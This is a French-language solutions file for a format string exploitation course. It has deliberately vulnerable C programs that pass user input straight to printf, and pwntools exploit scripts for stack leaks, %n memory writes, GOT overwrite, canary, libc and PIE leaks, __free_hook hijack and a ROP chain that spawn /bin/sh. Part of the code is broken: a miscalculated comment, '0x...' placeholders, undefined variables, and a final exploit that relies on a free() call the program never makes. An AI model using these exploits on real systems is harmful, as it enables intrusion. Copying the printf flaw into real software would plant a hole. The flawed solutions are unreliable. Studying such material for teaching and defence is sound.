# Solutions - Format String Linux

## Avertissement

Ce module est uniquement à des fins éducatives pour comprendre les vulnérabilités format string. L'utilisation de ces techniques sans autorisation est illégale.

---

## Exercice 1 : Découverte (Très facile)

**Objectif** : Comprendre les format strings et lire la mémoire

### Solution

```c
/*
 * Format String Basique - Lecture mémoire
 *
 * Compilation :
 * gcc -fno-stack-protector -no-pie format_basic.c -o format_basic
 */

#include <stdio.h>
#include <string.h>

int secret_value = 0xdeadbeef;

void vulnerable(char *input)
{
    char buffer[128];

    // Copie l'input
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';

    printf("[*] You entered: ");

    // VULNÉRABILITÉ : utilisation directe comme format string
    printf(buffer);  // Devrait être : printf("%s", buffer);

    printf("\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf("Usage: %s <format string>\n", argv[0]);
        printf("\n[*] Try these:\n");
        printf("  %%x          - Read stack value (hex)\n");
        printf("  %%p          - Read pointer\n");
        printf("  %%s          - Read string\n");
        printf("  %%x.%%x.%%x   - Read multiple values\n");
        printf("  %%N$p        - Read value at offset N\n");
        printf("\n");
        printf("[*] Secret value at: %p\n", &secret_value);
        return 1;
    }

    printf("[*] Format String Challenge\n");
    printf("[*] Secret value address: %p\n", &secret_value);
    printf("[*] Secret value: 0x%x\n\n", secret_value);

    vulnerable(argv[1]);

    return 0;
}
```

**Exploitation - Lecture de la pile** :

```bash
# Lire des valeurs de la pile
./format_basic "%x.%x.%x.%x"

# Lire des pointeurs
./format_basic "%p.%p.%p.%p"

# Accès direct à l'offset N
./format_basic "%3\$p"  # Lit la 3ème valeur

# Dump de la pile
./format_basic "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"
```

**Script Python pour explorer** :

```python
#!/usr/bin/env python3
"""
Exploration des format strings
"""

from pwn import *

binary = "./format_basic"

def test_offset(n):
    """Teste l'offset N"""
    p = process([binary, f"%{n}$p"])
    output = p.recvall()
    p.close()
    return output

def dump_stack(count=20):
    """Dump les N premiers offsets"""
    print("[*] Dumping stack...")

    for i in range(1, count + 1):
        payload = f"%{i}$p"
        p = process([binary, payload])
        output = p.recvall().decode()
        p.close()

        # Extrait la valeur
        if "You entered:" in output:
            value = output.split("You entered: ")[1].split("\n")[0]
            print(f"  Offset {i:2d}: {value}")

dump_stack(15)
```

**Explications** :

1. **Format Specifiers** :
   ```
   %x  - Hexadécimal (4 bytes)
   %p  - Pointeur (8 bytes sur x64)
   %s  - Chaîne (suit le pointeur)
   %n  - Écrit le nombre de bytes écrits
   %N$ - Accès direct à l'argument N
   ```

2. **Fonctionnement** :
   ```c
   printf("%x %x", arg1, arg2);  // Normal
   printf(buffer);                // Vulnérable : buffer = format string
   ```

   Si buffer contient "%x %x", printf lit la pile comme arguments !

3. **Organisation mémoire** :
   ```
   [Stack]
   +------------------+
   | ...              |
   +------------------+
   | Argument N       | <- %N$p
   +------------------+
   | ...              |
   +------------------+
   | buffer           | <- Notre input
   +------------------+
   ```

---

## Exercice 2 : Modification (Facile)

**Objectif** : Utiliser %n pour écrire en mémoire

### Solution

```c
/*
 * Format String - Écriture mémoire
 *
 * Compilation :
 * gcc -fno-stack-protector -no-pie format_write.c -o format_write
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int target = 0x11111111;
int authenticated = 0;

void check_auth()
{
    if (authenticated == 0x1337cafe) {
        printf("\n[!!!] Authentication successful!\n");
        printf("[+] Here's your shell:\n");
        system("/bin/sh");
    } else {
        printf("\n[-] Authentication failed\n");
        printf("    authenticated = 0x%x (expected 0x1337cafe)\n", authenticated);
    }
}

void vulnerable(char *input)
{
    char buffer[256];

    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';

    printf("[*] Processing: ");
    printf(buffer);
    printf("\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf("Usage: %s <format string>\n", argv[0]);
        printf("\n[*] Hints:\n");
        printf("  Target 'authenticated' at: %p\n", &authenticated);
        printf("  Need to write: 0x1337cafe\n");
        printf("  Use %%n to write\n");
        printf("  Use %%Nc (N chars) to control value\n");
        return 1;
    }

    printf("[*] Format String Write Challenge\n");
    printf("====================================\n\n");
    printf("[*] authenticated address: %p\n", &authenticated);
    printf("[*] Current value: 0x%x\n\n", authenticated);

    vulnerable(argv[1]);

    printf("\n[*] After printf:\n");
    printf("    authenticated = 0x%x\n", authenticated);

    check_auth();

    return 0;
}
```

**Exploitation avec %n** :

```python
#!/usr/bin/env python3
"""
Écriture en mémoire avec %n
"""

from pwn import *

context.arch = 'amd64'

binary = "./format_write"
elf = ELF(binary)

# Adresse de authenticated
target_addr = elf.symbols['authenticated']
print(f"[*] Target address: 0x{target_addr:x}")

# Valeur à écrire : 0x1337cafe
target_value = 0x1337cafe
print(f"[*] Target value: 0x{target_value:x}")

# === MÉTHODE 1 : Écriture simple avec %n ===
print("\n[*] Method 1: Simple %n write")

# %n écrit le nombre de caractères déjà écrits
# Pour écrire 0x1337cafe, on doit avoir écrit 322419454 caractères

# Pas pratique ! Utilisons plutôt plusieurs écritures

# === MÉTHODE 2 : Écriture par bytes avec %hhn ===
print("\n[*] Method 2: Byte-by-byte with %hhn")

# On va écrire byte par byte :
# 0x1337cafe = 0xfe 0xca 0x37 0x13 (little-endian)

# Trouve l'offset où notre buffer apparaît sur la pile
# (par fuzzing ou calcul)
offset = 6  # À ajuster

# Construction du payload
payload = b''

# Place les adresses sur la pile
payload += p64(target_addr + 0)  # Pour écrire byte 0
payload += p64(target_addr + 1)  # Pour écrire byte 1
payload += p64(target_addr + 2)  # Pour écrire byte 2
payload += p64(target_addr + 3)  # Pour écrire byte 3

# Écrit les bytes dans l'ordre
# Byte 0 : 0xfe = 254
bytes_written = len(payload)
payload += f"%{254 - bytes_written}c".encode()
payload += f"%{offset}$hhn".encode()

# Byte 1 : 0xca = 202 (on a déjà écrit 254, donc +948 = 202 mod 256)
payload += f"%{(202 - 254) % 256}c".encode()
payload += f"%{offset + 1}$hhn".encode()

# Byte 2 : 0x37 = 55
payload += f"%{(55 - 202) % 256}c".encode()
payload += f"%{offset + 2}$hhn".encode()

# Byte 3 : 0x13 = 19
payload += f"%{(19 - 55) % 256}c".encode()
payload += f"%{offset + 3}$hhn".encode()

print(f"[*] Payload size: {len(payload)} bytes")

# Test
p = process([binary, payload])
output = p.recvall()
print(output.decode())
```

**Version optimisée avec pwntools** :

```python
#!/usr/bin/env python3
"""
Utilisation de fmtstr_payload de pwntools
"""

from pwn import *

context.arch = 'amd64'

binary = "./format_write"
elf = ELF(binary)

# Trouve l'offset automatiquement
def find_offset():
    """Trouve l'offset où le buffer apparaît"""
    for i in range(1, 20):
        p = process([binary, f"AAAA%{i}$p"])
        output = p.recvall()
        p.close()

        if b"0x4141414141" in output:  # "AAAA" en hex
            print(f"[+] Found offset: {i}")
            return i

    return None

offset = find_offset()

if offset:
    # Construit automatiquement le payload
    target_addr = elf.symbols['authenticated']
    target_value = 0x1337cafe

    payload = fmtstr_payload(offset, {target_addr: target_value})

    print(f"[*] Payload: {payload}")

    p = process([binary, payload])
    p.interactive()
else:
    print("[-] Could not find offset")
```

**Explications** :

1. **%n modifier** :
   - Écrit le nombre de caractères déjà écrits
   - %n : 4 bytes, %hn : 2 bytes, %hhn : 1 byte
   - Exemple : `printf("AAAA%n", &var)` → var = 4

2. **Stratégie d'écriture** :
   - Placer l'adresse cible sur la pile
   - Utiliser %N$n pour écrire à cette adresse
   - Contrôler la valeur avec %Nc (padding)

3. **Écriture multi-bytes** :
   - Écrire byte par byte avec %hhn
   - Ou word par word avec %hn
   - Gérer les offsets et les valeurs cumulatives

---

## Exercice 3 : Création (Moyen)

**Objectif** : GOT overwrite pour hijack de fonction

### Solution

```c
/*
 * Format String - GOT Overwrite
 *
 * Compilation :
 * gcc -fno-stack-protector -no-pie -Wl,-z,norelro format_got.c -o format_got
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win()
{
    printf("\n[!!!] WIN function called!\n");
    printf("[+] Spawning shell...\n");
    system("/bin/sh");
}

void safe_function()
{
    printf("[*] Safe function - nothing happens\n");
}

void vulnerable()
{
    char buffer[256];

    printf("[*] Enter format string: ");
    fgets(buffer, sizeof(buffer), stdin);

    // Vulnérabilité
    printf(buffer);

    printf("\n[*] Calling safe function...\n");
    safe_function();
}

int main()
{
    printf("[*] Format String - GOT Overwrite\n");
    printf("===================================\n\n");

    printf("[*] win() address: %p\n", win);
    printf("[*] puts@GOT: %p\n", &puts);

    // Permet plusieurs tentatives
    while (1) {
        vulnerable();
    }

    return 0;
}
```

**Exploit GOT overwrite** :

```python
#!/usr/bin/env python3
"""
GOT overwrite via format string
On remplace puts@GOT par win()
"""

from pwn import *

context.arch = 'amd64'

binary = "./format_got"
elf = ELF(binary)

p = process(binary)

# === ÉTAPE 1 : RÉCUPÈRE LES ADRESSES ===
p.recvuntil(b'win() address: ')
win_addr = int(p.recvline().strip(), 16)

p.recvuntil(b'puts@GOT: ')
puts_got = int(p.recvline().strip(), 16)

print(f"[*] win() at: 0x{win_addr:x}")
print(f"[*] puts@GOT at: 0x{puts_got:x}")

# === ÉTAPE 2 : TROUVE L'OFFSET ===
print("\n[*] Finding offset...")

p.sendline(b"AAAA%p.%p.%p.%p.%p.%p")
leak = p.recvuntil(b'Enter format')

# Parse pour trouver notre buffer
# (simplifié, dans la réalité on automatiserait)
offset = 6  # Trouvé par fuzzing

print(f"[+] Offset: {offset}")

# === ÉTAPE 3 : OVERWRITE GOT ===
print("\n[*] Overwriting puts@GOT with win()")

# Construit le payload
payload = fmtstr_payload(offset, {puts_got: win_addr})

p.sendline(payload)

# === ÉTAPE 4 : TRIGGER ===
print("\n[*] Triggering puts()...")

# À la prochaine itération, puts sera appelée (par printf ou autre)
# et exécutera win() à la place

p.interactive()
```

**Version manuelle détaillée** :

```python
#!/usr/bin/env python3
"""
GOT overwrite manuel (sans pwntools fmtstr_payload)
"""

from pwn import *

binary = "./format_got"
elf = ELF(binary)
p = process(binary)

# Récupère les adresses
p.recvuntil(b'win() address: ')
win_addr = int(p.recvline().strip(), 16)

p.recvuntil(b'puts@GOT: ')
puts_got = int(p.recvline().strip(), 16)

print(f"[*] Target: overwrite puts@GOT (0x{puts_got:x})")
print(f"[*] Value: win() address (0x{win_addr:x})")

# Offset du buffer sur la pile
offset = 6

# Décompose win_addr en bytes (little-endian)
# Exemple : 0x0000000000401156
bytes_to_write = [
    (win_addr >> 0) & 0xff,   # LSB
    (win_addr >> 8) & 0xff,
    (win_addr >> 16) & 0xff,
    (win_addr >> 24) & 0xff,
    (win_addr >> 32) & 0xff,
    (win_addr >> 40) & 0xff,
    (win_addr >> 48) & 0xff,
    (win_addr >> 56) & 0xff,  # MSB
]

print(f"[*] Bytes to write: {[hex(b) for b in bytes_to_write]}")

# Construction du payload
payload = b''

# Place les adresses cibles
for i in range(8):
    payload += p64(puts_got + i)

# Current bytes written
current = len(payload)

# Écrit chaque byte
for i in range(8):
    target_byte = bytes_to_write[i]

    # Calcule combien de bytes supplémentaires écrire
    if target_byte >= current % 256:
        padding = target_byte - (current % 256)
    else:
        padding = 256 + target_byte - (current % 256)

    if padding > 0:
        payload += f"%{padding}c".encode()
        current += padding

    # Écrit le byte
    payload += f"%{offset + i}$hhn".encode()
    current += 1  # Pour le byte écrit par %hhn

print(f"\n[*] Payload size: {len(payload)}")

# Envoie
p.sendline(payload)

# Attend que GOT soit overwritten
p.recvuntil(b'Enter format')

# Envoie une commande qui trigger puts
p.sendline(b"trigger")

p.interactive()
```

**Explications** :

1. **GOT (Global Offset Table)** :
   - Contient les adresses des fonctions de libc
   - Résolu dynamiquement au runtime
   - Writable (si pas de RELRO)

2. **GOT Overwrite** :
   - Remplace l'adresse d'une fonction par notre choix
   - Quand la fonction est appelée, exécute notre code
   - Très puissant : redirection de contrôle

3. **Technique** :
   - Lire l'adresse de la GOT
   - Construire un payload qui écrit notre adresse
   - Utiliser %n pour écrire à la GOT
   - Appeler la fonction hijackée

---

## Exercice 4 : Challenge (Difficile)

**Objectif** : Exploitation format string avec ASLR + PIE

### Solution

```c
/*
 * Format String avec toutes les protections
 *
 * Compilation :
 * gcc -fstack-protector-all -fpie -pie format_full.c -o format_full
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void vuln()
{
    char buffer[512];

    printf("[*] Format string service\n");
    printf("[*] Enter input: ");

    fgets(buffer, sizeof(buffer), stdin);

    // Vulnérabilité format string
    printf(buffer);
}

int main()
{
    printf("[*] Format String - Full Protection\n");
    printf("[*] PIE + ASLR + Canary + NX + Full RELRO\n\n");

    // Setup
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    // Boucle pour permettre plusieurs interactions
    while (1) {
        vuln();
    }

    return 0;
}
```

**Exploit multi-étapes** :

```python
#!/usr/bin/env python3
"""
Exploitation format string avec toutes les protections

Stratégie :
1. Leak de la libc via format string
2. Leak du canary
3. Leak de la base du binaire (PIE)
4. Calcul des adresses
5. Écriture pour hijack (stack pivot ou autre)
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

binary = "./format_full"
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# === ÉTAPE 1 : LEAK LIBC ===
print("[*] === STAGE 1: Leaking libc ===")

# Envoie un format string pour leaker une adresse libc
# On cherche des adresses qui pointent dans la libc
# Généralement sur la pile il y a __libc_start_main+XX

payload1 = b"%3$p.%5$p.%7$p.%9$p.%11$p.%13$p"

p.sendlineafter(b'input: ', payload1)
leaks = p.recvline().strip().split(b'.')

print("[*] Leaks:")
for i, leak in enumerate(leaks):
    try:
        addr = int(leak, 16)
        print(f"  Leak {i}: 0x{addr:x}")
    except:
        pass

# Identifie quelle leak est dans la libc
# (nécessite de l'analyse préalable ou du fuzzing)
# Supposons que leak[3] soit __libc_start_main+231

libc_leak = int(leaks[3], 16)
libc_base = libc_leak - 0x29d90  # Offset à ajuster selon la version

print(f"\n[+] Libc base: 0x{libc_base:x}")

# === ÉTAPE 2 : LEAK CANARY ===
print("\n[*] === STAGE 2: Leaking canary ===")

# Le canary est sur la pile
# Utilise %N$p pour y accéder directement

payload2 = b"%15$p"  # Offset à ajuster

p.sendlineafter(b'input: ', payload2)
canary_leak = p.recvline().strip()
canary = int(canary_leak, 16)

print(f"[+] Canary: 0x{canary:x}")

# === ÉTAPE 3 : LEAK CODE BASE (PIE) ===
print("\n[*] === STAGE 3: Leaking code base ===")

# Cherche une adresse qui pointe dans le code
payload3 = b"%17$p"  # Offset à ajuster

p.sendlineafter(b'input: ', payload3)
code_leak = int(p.recvline().strip(), 16)

# Calcule la base (dépend de quelle adresse a leaké)
code_base = code_leak - 0x1234  # Offset à ajuster

print(f"[+] Code base: 0x{code_base:x}")

# === ÉTAPE 4 : CALCUL DES ADRESSES ===
print("\n[*] === STAGE 4: Calculating addresses ===")

system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
free_hook = libc_base + libc.symbols['__free_hook']

print(f"[*] system(): 0x{system_addr:x}")
print(f"[*] /bin/sh: 0x{binsh_addr:x}")
print(f"[*] __free_hook: 0x{free_hook:x}")

# === ÉTAPE 5 : EXPLOITATION ===
print("\n[*] === STAGE 5: Exploitation ===")

# Avec Full RELRO, on ne peut pas overwrite la GOT
# Options :
# - Overwrite __free_hook ou __malloc_hook
# - Stack pivot + ROP
# - Autre technique

# Option 1 : __free_hook overwrite
print("[*] Overwriting __free_hook with system()")

# Trouve l'offset du buffer
offset = 6  # À trouver

# Construit le payload
payload_exploit = fmtstr_payload(offset, {free_hook: system_addr})

p.sendlineafter(b'input: ', payload_exploit)

# === ÉTAPE 6 : TRIGGER ===
print("\n[*] === STAGE 6: Triggering ===")

# Il faut maintenant appeler free() avec "/bin/sh" comme argument
# Cela exécutera system("/bin/sh")

# Si l'application fait free() d'une chaîne contrôlée :
p.sendlineafter(b'input: ', b'/bin/sh')

p.interactive()
```

**Technique avancée : Arbitrary read/write** :

```python
#!/usr/bin/env python3
"""
Arbitrary read/write via format string
"""

from pwn import *

context.arch = 'amd64'

binary = "./format_full"
p = process(binary)

def fmt_read_qword(addr, offset=6):
    """Lit 8 bytes à une adresse arbitraire"""
    # Place l'adresse sur la pile
    payload = p64(addr)
    # Lit avec %s
    payload += f"%{offset}$s".encode()

    p.sendlineafter(b'input: ', payload)
    data = p.recvuntil(b'\n', drop=True)

    # Parse les données
    # Les 8 premiers bytes sont notre adresse
    leaked = data[8:]  # Skip notre adresse

    return leaked

def fmt_write_qword(addr, value, offset=6):
    """Écrit 8 bytes à une adresse arbitraire"""
    # Utilise fmtstr_payload
    payload = fmtstr_payload(offset, {addr: value})

    p.sendlineafter(b'input: ', payload)
    p.recvline()

# Exemple d'utilisation
# Lit la GOT
puts_got = 0x404020  # Exemple

data = fmt_read_qword(puts_got)
puts_addr = u64(data.ljust(8, b'\x00'))

print(f"[+] puts() at: 0x{puts_addr:x}")

# Calcule libc
# ...

# Écrit à __free_hook
free_hook = 0x...
system_addr = 0x...

fmt_write_qword(free_hook, system_addr)
```

**Technique : Format string + ROP** :

```python
#!/usr/bin/env python3
"""
Combine format string pour leak + stack overflow ROP
"""

from pwn import *

# Phase 1 : Format string pour leaks
# (comme précédemment)

# Phase 2 : Si le programme a aussi un buffer overflow
# Utilise les leaks pour construire une ROP chain

# Exemple :
canary = leaked_canary
libc_base = leaked_libc_base
code_base = leaked_code_base

# Construit ROP chain avec addresses calculées
pop_rdi = code_base + 0x...
ret = code_base + 0x...
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

rop_chain = flat([
    b'A' * offset,
    p64(canary),
    b'B' * 8,
    p64(ret),
    p64(pop_rdi),
    p64(binsh),
    p64(system)
])

# Envoie la ROP chain
p.sendline(rop_chain)
p.interactive()
```

**Explications avancées** :

1. **Multi-stage exploitation** :
   - Utilise plusieurs interactions
   - Leak d'abord, exploit ensuite
   - Cumule les informations

2. **Targets alternatifs avec RELRO** :
   - `__free_hook` / `__malloc_hook`
   - `__printf_chk` dans libc
   - Pointeurs de fonction sur la pile
   - Return addresses

3. **Techniques combinées** :
   - Format string + heap overflow
   - Format string + stack overflow
   - Format string + UAF

4. **Limitations** :
   - Full RELRO : GOT read-only
   - Canary : doit être leaké et restauré
   - ASLR/PIE : nécessite des leaks
   - Stack size : payload limité

---

## Points clés à retenir

1. **Vulnérabilité format string** :
   - Utilisation directe d'input comme format : `printf(buffer)`
   - Permet lecture et écriture arbitraire
   - Très puissante mais nécessite précision

2. **Exploitation** :
   - Lecture : %p, %x, %s
   - Écriture : %n, %hn, %hhn
   - Accès direct : %N$
   - GOT overwrite (si pas RELRO)

3. **Techniques avancées** :
   - Multi-stage : leak puis exploit
   - Hook overwrite : __free_hook, __malloc_hook
   - Arbitrary read/write primitives
   - Combinaison avec autres vulnérabilités

4. **Protections et bypass** :
   - RELRO : utiliser hooks au lieu de GOT
   - PIE : leak code base
   - ASLR : leak libc
   - Canary : leak et restaure

## Ressources complémentaires

- "Exploiting Format String Vulnerabilities" - scut/team teso
- Format string exploitation CTF writeups
- pwntools fmtstr documentation
- glibc hooks : __free_hook, __malloc_hook
- Modern format string techniques
